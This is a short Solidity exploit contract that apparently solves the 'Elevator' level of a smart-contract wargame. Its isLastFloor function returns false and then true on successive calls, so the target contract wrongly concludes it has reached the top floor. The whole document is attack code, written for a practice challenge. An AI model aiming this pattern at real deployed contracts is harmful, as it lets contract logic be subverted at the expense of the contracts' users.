contract ElevatorAttack is Building {
    Elevator elev;
    bool state;
    
    constructor(address _target) public {
        elev = Elevator(_target);
    }
    
    function attack() public {
        elev.goTo(5);
    }
    
    function isLastFloor(uint) external override returns (bool) {
        bool out = state;
        state = !state;
        return out;
    }
}